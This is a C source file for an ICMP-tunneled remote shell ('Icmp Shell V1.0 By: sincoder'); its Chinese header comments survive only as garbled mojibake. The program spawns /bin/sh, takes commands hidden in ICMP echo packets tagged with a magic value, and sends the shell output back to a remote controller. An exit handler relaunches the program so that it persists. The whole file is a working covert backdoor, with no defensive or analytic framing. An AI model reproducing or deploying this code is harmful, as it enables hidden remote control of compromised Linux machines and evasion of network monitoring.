/*
������ Linux �ϵķ����

��һ��

icmp ��һ�� replay �� �� һ�� request ��Ҫ��Ӧ...

�����Ƶ� linux Ҫ���� echo  request �� 
Ȼ�� windows �����Ҫ�رձ����� icmp echo �Ĺ��� ����Ӧ request ����  Ȼ�����ǵĳ��������� echo ���� 

linux ��Ҫ�ȷ�һ���� ���� ��ʼ shell --> ����������� ���ϵļ��� ������һ�� icmp request �����Ǹ� ip ���� icmp request ��ʼ shell
Ȼ�� windows �Ŀ��ƶ� 

Linux ��������һ����ʱ�� 1s ����һ�� request ���� �����ǲ����������� 

linux �������ݸ� windows ֻ��ͨ�� request �� 
windows �������ݸ� Linux ֻ��ͨ�� reply ��     ��Ϊ���ǲ��ܸ��Է����� request ��

linux --zip--> windows
 |               |
 |               |
 +--zip--0x842B--+
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/time.h>


typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;


#define dbg_msg(fmt,...) do{\
    printf(fmt,__VA_ARGS__); \
}while(0);

#define IN_BUF_SIZE   1024  //�������ݵĻ������Ĵ�С 
#define OUT_BUF_SIZE  64
#define SLEEP_TIME 1000

int  g_icmp_sock = 0;
int  g_CanThreadExit = 0; //�߳��ǲ��ǿ����˳��ˡ�
int  read_pipe[2];  //��ȡ�Ĺܵ�
int  write_pipe[2];
char *g_MyName = NULL;
uint32 g_RemoteIp = 0;// Զ�� ip 
char *g_Cmd = NULL; //Ҫִ�е�����
char *g_Request = NULL;//��������ݰ�
char *g_password = "sincoder"; //ͨ�ŵ�����
char *g_hello_msg = "Icmp Shell V1.0 \nBy: sincoder \n";


void MySleep(uint32 msec)
{
    struct timespec slptm;
    slptm.tv_sec = msec / 1000;
    slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
    if(nanosleep(&slptm,NULL) != -1)
    {

    }
    else
    {
        dbg_msg("%s : %u","nanosleep failed !!\n",msec);
    }
}

/*
 from tcpdump  not thread safe
*/
#define IPTOSBUFFERS    12

char *iptos(uint32 in)
{
    static char output[IPTOSBUFFERS][3*4+3+1];
    static short which;
    unsigned char *p;

    p = (unsigned char *)&in;
    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
    snprintf(output[which], sizeof(output[which]),"%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

/*
����һ���߳� 
*/
pthread_t MyCreateThread(void *(*func)(void *),void *lparam)
{
    pthread_attr_t attr;
    pthread_t  p;
    pthread_attr_init(&attr);
    //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    if(0 == pthread_create(&p,&attr,func,lparam))
    {
        pthread_attr_destroy(&attr);
        return p;
    }
    dbg_msg("pthread_create() error: %s \n",strerror(errno));
    pthread_attr_destroy(&attr);
    return 0;
}

/*
���� icmp ���ݰ��� У���
*/
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while(nbytes > 1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) 
    {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char  *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

uint16  random16()
{
    struct timeval tv;
    gettimeofday(&tv,NULL);
    return (uint16)tv.tv_sec * tv.tv_usec;
}

/*
���� icmp  echo request ��
ʧ�ܷ��� -1
�ɹ����� 0
*/
int  icmp_sendrequest(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
{
    struct icmphdr *icmp;
    struct sockaddr_in addr;
    int nbytes;
    int ret = 1;

    icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);
    if(NULL == icmp)
    {
        return -1;
    }
    icmp->type = 8;  // icmp  request
    icmp->code = 0;
    icmp->un.echo.id = random16();
    icmp->un.echo.sequence = random16();

    memcpy(icmp + 1,pdata,size);
    memset(&addr,0,sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    
    icmp->checksum = 0x00; // echo replay 
    icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);

    // send reply
    nbytes = sendto(g_icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
    if (nbytes == -1) 
    {
        perror("sendto");
        ret = -1;
    }
    free(icmp);
    return ret;
}

/*
���� ���� �� ���ݽ��� ѹ��
*/
int SendData(unsigned char *pData,int Size)
{
    return icmp_sendrequest(g_icmp_sock,g_RemoteIp,pData,Size);
}

void set_fd_noblock(int fd)
{
    int flags;
    flags = fcntl(fd, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

/*
����������߳�
*/
void *Icmp_RecvThread(void *lparam)
{
    char in_buf[IN_BUF_SIZE];
    struct iphdr *ip;
    struct icmphdr *icmp;
    char *data;
    int nbytes = 0;

    dbg_msg("%s:Icmp_RecvThread  start !! \n",__func__);

    while(1) 
    {
        // read data from socket
        memset(in_buf, 0x00, IN_BUF_SIZE);
        nbytes = read(g_icmp_sock, in_buf, IN_BUF_SIZE - 1);
        if (nbytes > 0) 
        {
            // get ip and icmp header and data part
            ip = (struct iphdr *) in_buf;
            if (nbytes > sizeof(struct iphdr))
            {
                int iplen = ip->ihl * sizeof(unsigned int);
                nbytes -= sizeof(struct iphdr);
                icmp = (struct icmphdr *) ((char *)ip + iplen);
                if(0 == icmp->type)  //ֻ���� icmp request �����
                {
                    if (nbytes > sizeof(struct icmphdr))
                    {
                        nbytes -= sizeof(struct icmphdr);
                        if(nbytes > 2)
                        {
                            data = (char *) (icmp + 1);  //�õ� icmp ͷ ��������� 
                            if(0x842B == *(uint16 *)data)  //��֤���ǲ������ǵĿͻ��˷���
                            {
                                data += 2;
                                nbytes -= 2;
                                data[nbytes] = '\0';
                                dbg_msg("%s:icmp recv %s  \n",__func__, data);
                                // д�� shell ���� 
                                data[nbytes] = '\n';  //���������� ���� Ӧ�� ���ܺ��� \n
                                write(write_pipe[1],data,nbytes+1);
                                fflush(stdout);

                                //����ҲҪ���� ����һ�� request ������ ��ľ�������� ��ʱҪ��ʱ�� 
                                MySleep(SLEEP_TIME);

                                icmp_sendrequest(g_icmp_sock,ip->saddr,NULL,0);
                            }
                        }
                    }
                }
                else if(8 == icmp->type)
                {
                    //icmp request 
                    //��ʱ ���� hello msg
                    dbg_msg("%s: recv a icmp request from %s \n",__func__,iptos(ip->saddr));
                    icmp_sendrequest(g_icmp_sock,ip->saddr,(uint8 *)g_hello_msg,strlen(g_hello_msg)); //
                }
            }
        }
        if(-1 == nbytes)
        {
            dbg_msg("%s:read() error \n",__func__);
            perror("read() :");
            break;
        }
    }
    dbg_msg("%s: Thread exit ... \n",__func__);
    return NULL;
}

/*
�ӹܵ��ж�ȡ���ݣ�����ִ�еĽ���������ͳ�ȥ 
*/
void *ShellPipe_ReadThread(void *lparam)
{
    unsigned char buff[512];
    int nBytes = 0;

    dbg_msg("%s:ShellPipe_ReadThread  start ...\n",__func__);
    while((nBytes = read(read_pipe[0],&buff[0],510)) > 0)
    {
        dbg_msg("%s: recv %d bytes from pipe: %s \n",__func__,nBytes,buff);
        SendData(buff,nBytes);
    }
    dbg_msg("%s: thread exit ... \n",__func__);
    return NULL;
}

// void *Timer_thread(void *lparam)
// {
//     while (MySleep(SLEEP_TIME))
//     {
//         icmp_sendrequest(g_icmp_sock,)
//     }
// }
 

/*
�˳���ʱ��������������
*/
void OnExit()
{
    dbg_msg("%s:exiting ������\n",__func__);
    sleep(1);
    if(g_MyName)
        system(g_MyName); //������������
}

int main(int argc, char **argv)
{
    int pid;
    g_MyName = argv[0]; //������
    atexit(OnExit);
    // create raw ICMP socket
    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (g_icmp_sock == -1) 
    {
        perror("socket");
        return -1;
    }

    pipe(read_pipe);
    pipe(write_pipe);

    pid = fork();

    if(0 == pid)
    {
        //�����ӽ���
        //���� shell ����
        close(read_pipe[0]);
        close(write_pipe[1]);
        char *argv[] = {"/bin/sh",NULL};
        char *shell = "/bin/sh";
        dup2(write_pipe[0],STDIN_FILENO); //����������ض��򵽹ܵ�
        dup2(read_pipe[1],STDOUT_FILENO);
        dup2(read_pipe[1],STDERR_FILENO);
        execv(shell,argv);  //���� shell 
    }
    else
    {
        pthread_t hIcmpRecv;
        pthread_t hShellRead;
        close(read_pipe[1]);
        close(write_pipe[0]);
        dbg_msg("child process id %d \n",pid);
        //����һ���߳�����ȡ
        hIcmpRecv = MyCreateThread(Icmp_RecvThread,NULL);
        hShellRead = MyCreateThread(ShellPipe_ReadThread,NULL);
        if(0 == hIcmpRecv || 0 == hShellRead)
        {
            dbg_msg("%s:Create Thread exit ... \n",__func__);
        }
        waitpid(pid,NULL,0);  //�ȴ��ӽ����˳�
        close(read_pipe[0]);
        close(write_pipe[1]);
        pthread_join(hIcmpRecv,NULL);  //�̻߳���Ϊ����ľ���ر� ���˳�
        pthread_join(hShellRead,NULL);
        dbg_msg("%s:child exit. ..\n",__func__);
    }
    return 0;
}
